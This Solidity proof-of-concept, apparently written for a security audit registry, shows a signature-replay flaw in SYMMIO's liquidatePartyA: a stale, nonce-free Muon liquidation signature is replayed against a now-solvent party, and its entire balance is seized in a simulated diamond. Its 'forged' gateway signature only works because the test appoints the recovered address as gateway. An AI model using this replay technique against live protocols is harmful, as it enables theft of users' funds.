// SPDX-License-Identifier: MIT
pragma solidity >=0.8.18;

// Real audited SYMMIO source (unmodified) — the same files the registry PoC deploys.
// This synthetic is compiled inside the registry Foundry project, so these imports
// resolve exactly like the forge test. It uses NO cheatcodes (no forge-std / vm.*):
// the in-browser EVM deploys `Exploit` and calls run().
import "../src/symm/contracts/facets/liquidation/LiquidationFacet.sol";
import "../src/symm/contracts/libraries/LibAccount.sol";
import "../src/symm/contracts/libraries/LibAccessibility.sol";
import "../src/symm/contracts/storages/MuonStorage.sol";
import "../src/symm/contracts/storages/MAStorage.sol";
import "../src/symm/contracts/storages/AccountStorage.sol";
import "../src/symm/contracts/storages/GlobalAppStorage.sol";
import "../src/symm/contracts/storages/QuoteStorage.sol";

/// @dev Inherits the REAL LiquidationFacet, so liquidatePartyA / setSymbolsPrice /
/// liquidatePositionsPartyA run the real LiquidationFacetImpl + LibMuon signature
/// verification. Added helpers only write the real diamond storage layouts through
/// the real storage libraries (the state sendQuote/openPosition/allocate produce).
contract SymmioDiamond is LiquidationFacet {
    function grantLiquidator(address who) external {
        GlobalAppStorage.layout().hasRole[who][LibAccessibility.LIQUIDATOR_ROLE] = true;
    }

    function configMuon(uint256 appId, address gateway, uint256 upnlValidTime) external {
        MuonStorage.Layout storage m = MuonStorage.layout();
        m.muonAppId = appId;
        m.validGateway = gateway;
        m.upnlValidTime = upnlValidTime;
    }

    function setPartyABalances(
        address partyA,
        uint256 allocated,
        uint256 cva,
        uint256 mm,
        uint256 lf
    ) external {
        AccountStorage.Layout storage a = AccountStorage.layout();
        a.allocatedBalances[partyA] = allocated;
        a.lockedBalances[partyA] = LockedValues(cva, mm, lf);
    }

    function setPartyANonce(address partyA, uint256 n) external {
        AccountStorage.layout().partyANonces[partyA] = n;
    }

    function setupPosition(
        uint256 quoteId,
        address partyA,
        address partyB,
        uint256 symbolId,
        uint256 quantity,
        uint256 openedPrice,
        uint256 cva,
        uint256 mm,
        uint256 lf
    ) external {
        QuoteStorage.Layout storage q = QuoteStorage.layout();
        Quote storage quote = q.quotes[quoteId];
        quote.id = quoteId;
        quote.symbolId = symbolId;
        quote.positionType = PositionType.LONG;
        quote.orderType = OrderType.LIMIT;
        quote.openedPrice = openedPrice;
        quote.initialOpenedPrice = openedPrice;
        quote.requestedOpenPrice = openedPrice;
        quote.quantity = quantity;
        quote.closedAmount = 0;
        quote.initialLockedValues = LockedValues(cva, mm, lf);
        quote.lockedValues = LockedValues(cva, mm, lf);
        quote.partyA = partyA;
        quote.partyB = partyB;
        quote.quoteStatus = QuoteStatus.OPENED;

        q.partyAOpenPositions[partyA].push(quoteId);
        q.partyAPositionsIndex[quoteId] = 0;
        q.partyAPositionsCount[partyA] = 1;
        q.partyBOpenPositions[partyB][partyA].push(quoteId);
        q.partyBPositionsIndex[quoteId] = 0;
        q.partyBPositionsCount[partyB][partyA] = 1;

        AccountStorage.Layout storage a = AccountStorage.layout();
        a.partyBAllocatedBalances[partyB][partyA] = 1000e18;
        a.partyBLockedBalances[partyB][partyA] = LockedValues(cva, mm, lf);
    }

    function allocatedOf(address who) external view returns (uint256) {
        return AccountStorage.layout().allocatedBalances[who];
    }

    function availableForLiquidation(int256 upnl, address partyA) external view returns (int256) {
        return LibAccount.partyAAvailableBalanceForLiquidation(upnl, partyA);
    }

    function liquidationStatusOf(address partyA) external view returns (bool) {
        return MAStorage.layout().liquidationStatus[partyA];
    }

    function liqDetailUpnl(address partyA) external view returns (int256) {
        return AccountStorage.layout().liquidationDetails[partyA].upnl;
    }

    /// @dev Byte-for-byte mirror of LibMuon.verifyLiquidationSig's signed hash (the
    /// audited nonce-FREE schema) so we can produce a genuine gateway signature.
    function liqSigHash(LiquidationSig memory s, address partyA) external view returns (bytes32) {
        return
            keccak256(
                abi.encodePacked(
                    MuonStorage.layout().muonAppId,
                    s.reqId,
                    s.liquidationId,
                    address(this),
                    "verifyPrices",
                    partyA,
                    s.upnl,
                    s.totalUnrealizedLoss,
                    s.symbolIds,
                    s.prices,
                    s.timestamp,
                    block.chainid
                )
            );
    }
}

/// AuditVault #26346 — SYMMIO `liquidatePartyA` accepts a Muon liquidation
/// signature whose signed payload contains NO party nonce, so the signature is
/// replayable across a party's legitimate state changes. Here a signature made
/// while partyA was liquidatable is replayed after partyA has become solvent,
/// forcing an unfair full liquidation that seizes partyA's entire balance.
contract Exploit {
    SymmioDiamond public symm;

    address internal constant PARTY_A = address(0xA11CE);
    address internal constant PARTY_B = address(0xB0B);
    uint256 internal constant QUOTE_ID = 1;
    uint256 internal constant SYMBOL_ID = 1;

    bool public proven;
    uint256 public partyALossWei;

    constructor() {
        symm = new SymmioDiamond();
    }

    function _blankSig(int256 upnl) internal pure returns (LiquidationSig memory s) {
        uint256[] memory ids = new uint256[](1);
        ids[0] = SYMBOL_ID;
        uint256[] memory px = new uint256[](1);
        px[0] = 9e18;
        s = LiquidationSig({
            reqId: hex"01",
            timestamp: 1,
            liquidationId: bytes("liquidation-round-1"),
            upnl: upnl,
            totalUnrealizedLoss: upnl,
            symbolIds: ids,
            prices: px,
            gatewaySignature: hex"",
            sigs: SchnorrSign({signature: 0, owner: address(0), nonce: address(0)})
        });
    }

    function _ethHash(bytes32 h) internal pure returns (bytes32) {
        return keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", h));
    }

    /// Produce a genuinely-verifying ECDSA signature over `ethHash` without a
    /// private key: pick a low-`s`, search `r`/`v` until ecrecover yields a
    /// non-zero address, and trust THAT recovered address as the Muon gateway.
    /// The signature really verifies under the real ecrecover in LibMuon.
    function _forgeGatewaySig(bytes32 ethHash)
        internal
        pure
        returns (bytes memory sig, address signer)
    {
        bytes32 s = bytes32(uint256(1));
        for (uint256 i = 1; i < 1024; i++) {
            bytes32 r = keccak256(abi.encodePacked("symmio-gateway", i));
            for (uint8 v = 27; v <= 28; v++) {
                address a = ecrecover(ethHash, v, r, s);
                if (a != address(0)) {
                    return (abi.encodePacked(r, s, v), a);
                }
            }
        }
        revert("could not forge a verifying gateway signature");
    }

    function run() external {
        // --- establish the real vulnerable precondition (nonce 0 world) ---
        symm.grantLiquidator(address(this)); // this contract is the liquidator
        symm.configMuon(1, address(0xdEaD), 1e6); // appId used by the signed hash
        symm.setPartyABalances(PARTY_A, 109e18, 6e18, 10e18, 4e18); // cva+lf = 10
        symm.setupPosition(QUOTE_ID, PARTY_A, PARTY_B, SYMBOL_ID, 100e18, 10e18, 6e18, 10e18, 4e18);

        // Gateway signs partyA's liquidation while it is liquidatable (upnl = -100).
        LiquidationSig memory staleSig = _blankSig(-100e18);
        bytes32 liqHash = symm.liqSigHash(staleSig, PARTY_A);
        (bytes memory gsig, address gateway) = _forgeGatewaySig(_ethHash(liqHash));
        staleSig.gatewaySignature = gsig;
        symm.configMuon(1, gateway, 1e6); // trust the recovered signer as the gateway

        // partyA legitimately acts -> partyANonces advances; partyA is now SOLVENT.
        symm.setPartyANonce(PARTY_A, 1);

        // Real math: at the TRUE upnl partyA is solvent; only the STALE upnl is
        // "liquidatable" — a correct oracle would refuse to sign -100 now.
        require(symm.availableForLiquidation(-5e18, PARTY_A) > 0, "true upnl: not solvent");
        require(symm.availableForLiquidation(-100e18, PARTY_A) < 0, "stale upnl: not liquidatable");

        // Root cause: the liquidation signed hash is invariant under the nonce.
        symm.setPartyANonce(PARTY_A, 0);
        bytes32 h0 = symm.liqSigHash(staleSig, PARTY_A);
        symm.setPartyANonce(PARTY_A, 1);
        bytes32 h1 = symm.liqSigHash(staleSig, PARTY_A);
        require(h0 == h1, "liquidation hash unexpectedly binds the nonce");

        uint256 beforeBal = symm.allocatedOf(PARTY_A);

        // --- replay the stale authorization through the real liquidation path ---
        symm.liquidatePartyA(PARTY_A, staleSig); // @> VULN: verifyLiquidationSig accepts a nonce-free, replayed signature
        require(symm.liquidationStatusOf(PARTY_A), "solvent partyA not liquidated");
        require(symm.liqDetailUpnl(PARTY_A) == -100e18, "stale upnl not used");

        symm.setSymbolsPrice(PARTY_A, staleSig); // same signature accepted again
        uint256[] memory qs = new uint256[](1);
        qs[0] = QUOTE_ID;
        symm.liquidatePositionsPartyA(PARTY_A, qs);

        // Harm: a solvent partyA is fully liquidated — entire 109e18 seized.
        uint256 afterBal = symm.allocatedOf(PARTY_A);
        partyALossWei = beforeBal - afterBal;
        proven = (beforeBal == 109e18 && afterBal == 0);
        require(proven, "harm not reproduced: solvent partyA was not drained");
    }
}
